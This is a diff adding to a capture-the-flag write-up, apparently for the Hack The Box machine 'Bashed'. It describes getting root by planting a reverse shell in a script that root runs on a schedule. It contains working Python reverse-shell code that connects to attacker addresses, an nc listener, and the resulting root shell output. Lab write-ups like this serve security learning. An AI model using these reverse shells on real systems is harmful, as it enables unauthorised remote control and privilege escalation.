@@ -118,4 +118,64 @@ User www-data may run the following commands on bashed:
 (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
 
-To get the root flag, I need a reverse shell, as the connection through this phpbash.php is not persistent.
+To get the root flag, I need a reverse shell, as the connection through this phpbash.php is not persistent. 
+
+Using the Reverse shell cheatsheets, I tried nc but it did not work.
+
+Python shell worked.
+
+```
+export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+And then sudo -u scriptmanager bash.
+
+When I go to / and ls, I see a scripts folder owned by scriptmanager.
+
+```
+scriptmanager@bashed:/scripts$ ls -l
+ls -l
+total 8
+-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
+-rw-r--r-- 1 root          root          12 Dec 20 17:53 test.txt
+
+```
+The python script runs as scriptmanager but saves a test.txt as root. So we edit the python script to start a reverse shell, and we get a root shell. Editing the test.py was a little tricky, but ultimately it worked.
+
+Using vi test.py, here are the contents of test.py
+```
+scriptmanager@bashed:/scripts$ cat test.py
+cat test.py
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.11",4242))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+scriptmanager@bashed:/scripts$ ls -l
+ls -l
+total 8
+-rw-r--r-- 1 scriptmanager scriptmanager 213 Dec 20 18:13 test.py
+-rw-r--r-- 1 root          root           12 Dec 20 18:07 test.txt
+scriptmanager@bashed:/scripts$ python test.py
+
+```
+
+Once test.py is run, the nc session on 4242 shows a conenction from this host. We see that this is running as root.
+
+```
+──╼ $nc -lvnp 4242
+listening on [any] 4242 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.68] 55166
+/bin/sh: 0: can't access tty; job control turned off
+# ls
+test.py
+test.txt
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls /root
+root.txt
+# cat /root/root.txt
+
+```
